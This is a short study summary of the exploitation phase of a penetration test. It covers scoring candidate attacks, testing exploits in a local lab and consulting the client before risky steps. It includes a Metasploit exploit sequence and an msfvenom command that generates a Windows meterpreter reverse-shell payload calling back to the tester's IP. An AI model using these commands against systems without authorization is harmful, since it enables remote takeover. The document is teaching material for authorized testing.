# Exploitation Phase Summary

Exploitation adapts identified vulnerabilities to gain access (e.g., foothold, priv escalation). Modify Proof-of-Concepts (PoCs) for specific goals like reverse shells. Closely tied to other phases; track steps to avoid confusion in long tests.

## Prioritization of Possible Attacks

Evaluate vulnerabilities based on:

- **Probability of Success**: Likelihood of working (use CVSS scores via NVD calculator).
- **Complexity**: Effort required (easy/medium/hard; experience matters).
- **Probability of Damage**: Risk of disruption (avoid DoS unless specified).

Assign points for ranking (e.g., higher success/complexity scores positive; damage negative).

**Example Scoring**:

| Factor | Points | Remote File Inclusion | Buffer Overflow |
|--------|--------|-----------------------|-----------------|
| Probability of Success | 10 | 10 | 8 |
| Complexity - Easy | 5 | 4 | 0 |
| Complexity - Medium | 3 | 0 | 3 |
| Complexity - Hard | 1 | 0 | 0 |
| Probability of Damage | -5 | 0 | -5 |
| **Summary (max 15)** | | **14** | **6** |

Prefer Remote File Inclusion (higher score, safer).

**Additional Tools**: CVSS calculators (online NVD); custom scoring scripts in Python for automation.

## Preparation for the Attack

- If no reliable PoC, mirror target locally (same versions/services) on VM.
- Test exploit on local setup to ensure functionality/safety.
- For known vulns/misconfigs, use standard tools/techniques.

**Additional Tools/Commands**:

- Metasploit: `msfconsole` then `use exploit/module; set RHOSTS targetIP; exploit`.
- msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourIP LPORT=4444 -f exe > payload.exe` (Generate payload).
- Local testing: VirtualBox/VMware for VMs; Docker for services (e.g., `docker run -p 80:80 vuln/app`).

## Decision-Making and Execution

- Consult client for risky exploits (provide details; may opt to note as issue without testing).
- Use judgment; prioritize communication over disruption.
- After success: Log activities, note for reports, proceed to Post-Exploitation/Lateral Movement.

**General Tips**: Always test locally first. Document modifications. For HTB, practice exploits on boxes. If exploit fails, revisit Vulnerability Assessment. Use encrypted connections (e.g., HTTPS for reverse shells).
